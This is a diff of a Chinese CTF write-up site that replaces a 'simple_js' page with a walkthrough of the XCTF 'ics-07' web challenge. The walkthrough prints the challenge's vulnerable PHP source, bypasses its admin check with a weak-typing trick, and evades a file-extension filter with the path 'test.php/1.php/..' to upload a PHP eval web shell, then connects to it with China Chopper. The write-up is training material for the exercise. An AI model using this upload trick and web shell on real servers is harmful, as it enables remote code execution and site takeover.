@@ -13,7 +13,7 @@
         <meta name="description" content="drkless docs">
       
       
-        <link rel="canonical" href="https://darkless.cn/my-docs/XCTF-web-simplejs/">
+        <link rel="canonical" href="https://darkless.cn/my-docs/XCTF-web-ics-07/">
       
       
         <meta name="author" content="hand">
@@ -42,7 +42,7 @@
     
     
       
-        <title>simple_js - DarkLess</title>
+        <title>ics-07 - DarkLess</title>
       
     
     
@@ -136,7 +136,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                simple_js
+                ics-07
               
             </span>
           
@@ -216,7 +216,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../XCTF-primary-writeup/" class="md-tabs__link md-tabs__link--active">
+        <a href="../XCTF-primary-writeup/" class="md-tabs__link">
           XCTF初级wp
         </a>
       
@@ -229,7 +229,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../XCTF-challenge-writeup/" class="md-tabs__link">
+        <a href="../XCTF-challenge-writeup/" class="md-tabs__link md-tabs__link--active">
           XCTF高级wp
         </a>
       
@@ -432,12 +432,10 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
     
     <label class="md-nav__link" for="nav-3">
       XCTF初级wp
@@ -537,52 +535,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        simple_js
-      </label>
-    
-    <a href="./" title="simple_js" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../XCTF-web-simplejs/" title="simple_js" class="md-nav__link">
       simple_js
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">目录</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    思路
-  </a>
-  
-</li>
-      
-      
-      
-      
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -655,10 +612,12 @@
       
       
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
     
     <label class="md-nav__link" for="nav-4">
       XCTF高级wp
@@ -842,11 +801,52 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../XCTF-web-ics-07/" title="ics-07" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        ics-07
+      </label>
+    
+    <a href="./" title="ics-07" class="md-nav__link md-nav__link--active">
       ics-07
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    题目描述
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -875,7 +875,7 @@
       
         <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    题目
+    题目描述
   </a>
   
 </li>
@@ -904,34 +904,135 @@
               
                 
                 
-                  <h1>simple_js</h1>
+                  <h1>ics-07</h1>
                 
-                <p>XCTF第七题simple_js  write up</p>
-<h2 id="_1">题目</h2>
-<p>小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )</p>
+                <h2 id="_1">题目描述</h2>
+<p>工控云管理系统项目管理页面解析漏洞</p>
 <h2 id="_2">思路</h2>
-<p>打开页面在输入框中输入任何内容都显示一个结果</p>
-<p><img alt="20190827183050.png" src="https://i.loli.net/2019/08/27/jHGWzPTnNqxp9Ed.png" /></p>
-<p>查看网页源码</p>
-<p><img alt="20190827183130.png" src="https://i.loli.net/2019/08/27/HLvxS2CyVD9XKJU.png" /></p>
-<p>发现这段JS代码表示完全无论我们输入的什么内容，结果都是一样的，所以判断这段代码无用。</p>
-<p>有用的是：</p>
-<pre><code class="js"> String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));
+<p>打开题目，点击左侧导航进入项目管理页</p>
+<p><img alt="20190907175624.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907175624.png" /></p>
+<p>可看到可以查看源码</p>
+<p><img alt="20190907175654.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907175654.png" /></p>
+<p>源码如下：</p>
+<pre><code class="php">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;cetc7&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;?php
+    session_start();
+
+    if (!isset($_GET[page])) {
+      show_source(__FILE__);
+      die();
+    }
+
+    if (isset($_GET[page]) &amp;&amp; $_GET[page] != 'index.php') {
+      include('flag.php');
+    }else {
+      header('Location: ?page=flag.php');
+    }
+
+    ?&gt;
+
+    &lt;form action=&quot;#&quot; method=&quot;get&quot;&gt;
+      page : &lt;input type=&quot;text&quot; name=&quot;page&quot; value=&quot;&quot;&gt;
+      id : &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;&quot;&gt;
+      &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;
+    &lt;/form&gt;
+    &lt;br /&gt;
+    &lt;a href=&quot;index.phps&quot;&gt;view-source&lt;/a&gt;
+
+    &lt;?php
+     if ($_SESSION['admin']) {
+       $con = $_POST['con'];
+       $file = $_POST['file'];
+       $filename = &quot;backup/&quot;.$file;
+
+       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
+          die(&quot;Bad file extension&quot;);
+       }else{
+            chdir('uploaded');
+           $f = fopen($filename, 'w');
+           fwrite($f, $con);
+           fclose($f);
+       }
+     }
+     ?&gt;
+
+    &lt;?php
+      if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') {
+        include 'config.php';
+        $id = mysql_real_escape_string($_GET[id]);
+        $sql=&quot;select * from cetc007.user where id='$id'&quot;;
+        $result = mysql_query($sql);
+        $result = mysql_fetch_object($result);
+      } else {
+        $result = False;
+        die();
+      }
+
+      if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;);
+      if($result){
+        echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;;
+        echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;;
+        $_SESSION['admin'] = True;
+      }
+     ?&gt;
+
+  &lt;/body&gt;
+&lt;/html&gt;
 </code></pre>
 
-<p>写python脚本进行转码即可：</p>
-<pre><code class="python">string = &quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;
-s = string.split(&quot;,&quot;)
-c = &quot;&quot;
-for i in s:
-    i = chr(int(i))
-    c = c+i
-print(c)
-
+<p>对源码进行审计</p>
+<p><img alt="20190907175802.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907175802.png" /></p>
+<p>这段说当session为admin时可以上传文件，文件会保存到<code>uploaded/backup</code>目录下，但是使用黑名单过滤掉了<code>ph(p[3457]?|t|tml)</code>这些后缀。</p>
+<p><img alt="20190907175957.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907175957.png" /></p>
+<p>这段说当传入的id值浮点值不能为1，但是id的最后一个数必须为9，session才能为admin。</p>
+<p>利用php弱类型语言的特性可轻松绕过这一限制。</p>
+<p>如下：</p>
+<p><img alt="20190907180230.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907180230.png" /></p>
+<p>当id为1a9时可符合上面的要求。</p>
+<p><img alt="20190907180310.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907180310.png" /></p>
+<p><img alt="20190907180646.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907180646.png" /></p>
+<p>可看到现在已经是admin用户了，那就继续上传文件拿到shell。原本想的这里是否可以进行注入，是代码中使用了<code>mysql_real_escape_string()</code>函数 , 该函数用于转义SQL语句中使用的字符串中的特殊字符 , 防御SQL注入 . 虽然可以利用宽字符注入绕过这个防御机制 , 但是要求目标站点使用GBK编码 . 这些细节信息我都不知道 , 所以想要注入是比较难的.</p>
+<p>那么如何访问上传的文件已经不再是问题 , 需要做的仅仅是突破这个正则过滤 . 正则对文件后缀进行限制 . 所以关键点还是在文件后缀名上</p>
+<p>如何突破文件后缀名的限制?主要思路有如下三点</p>
+<p>一种是Web中间件的解析漏洞 , 因为已经知道中间件是Apache2 , 使用的是PHP . 所以无非就是Apache解析漏洞或者PHP CGI解析漏洞</p>
+<p>一种是通过上传.htaccess文件 , 该文件是Apache的一大特色 . 其中一个功能便是修改不同MIME类型文件使用的解析器 . 但要使用该功能需要Apache在配置文件中设置AllowOverride All , 并且启用Rewrite模块 , 经过测试发现上传的.htaccess无法生效</p>
+<pre><code class="php"># 举个例子 : 上传 .htaccess 文件 , 其中写入如下内容
+ &lt;FilesMatch &quot;shell.jpg&quot;&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+# 此时 , shell.jpg 会被解析为PHP文件
+# 但是经过测试这里 .htaccess 功能被禁用了
 </code></pre>
 
-<p>结果：</p>
-<p>786OsErtk12</p>
+<p>罕见文件后缀 , 想要解析PHP文件 , 并非后缀要是*.php . 如果查看mime.types , 会发现很多文件后缀都使用了application/x-httpd-php这个解析器</p>
+<p><img alt="20190907181021.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907181021.png" /></p>
+<p>其中 phps 和 php3p 都是源代码文件 , 无法被执行 . 而剩下所有的后缀都被正则表过滤 , 所以这种方式也无法成功上传可执行文件</p>
+<p>所以最后还是回到了中间件解析漏洞上 , 但是经过测试发现并不是常规的解析漏洞 , 而是利用了一个Linux的目录结构特性 , 请看下面代码</p>
+<p><img alt="20190907181102.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907181102.png" /></p>
+<p>创建了一个目录为1.php , 在 1.php 下创建了一个子目录为 2.php 。Linux下每创建一个新目录 , 都会在其中自动创建两个隐藏文件。</p>
+<p><img alt="20190907181148.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907181148.png" /></p>
+<p>其中 <code>..</code> 代表当前目录的父目录 , <code>.</code>代表当前目录 , 所以这里访问 <code>./1.php/2.php/..</code> 代表访问 <code>2.php</code>的父目录 , 也就是访问 <code>1.php</code> 。</p>
+<p>因此这里构造数据包时 , 可以构造如下POST数据</p>
+<pre><code class="php">con=&lt;?php @eval($_POST[cmd]);?&gt;&amp;file=test.php/1.php/..
+</code></pre>
+
+<p><img alt="20190907181726.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907181726.png" /></p>
+<p>然后访问上传目录</p>
+<p><img alt="20190907181816.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907181816.png" /></p>
+<p>可看到已将test.php上传了上去。</p>
+<p>使用菜刀连接，即可得到shell，然后找到falg即可</p>
+<p><img alt="20190907182101.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907182101.png" /></p>
+<p><img alt="20190907182114.png" src="https://raw.githubusercontent.com/handbye/images/master/20190907182114.png" /></p>
+<p>参考：</p>
+<ul>
+<li><a href="http://www.guildhab.top/?p=481">http://www.guildhab.top/?p=481</a></li>
+</ul>
                 
                   
                 
@@ -952,7 +1053,7 @@ print(c)
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../XCTF-web-disable_buttom/" title="disable_buttom" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../XCTF-web-i-got-id-200/" title="i-got-id-200" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -961,25 +1062,11 @@ print(c)
                 <span class="md-footer-nav__direction">
                   上一页
                 </span>
-                disable_buttom
+                i-got-id-200
               </span>
             </div>
           </a>
         
-        
-          <a href="../XCTF-web-xff_refer/" title="xff_refer" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
-            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
-              <span class="md-flex__ellipsis">
-                <span class="md-footer-nav__direction">
-                  下一页
-                </span>
-                xff_refer
-              </span>
-            </div>
-            <div class="md-flex__cell md-flex__cell--shrink">
-              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
-            </div>
-          </a>
         
       </nav>
     </div>
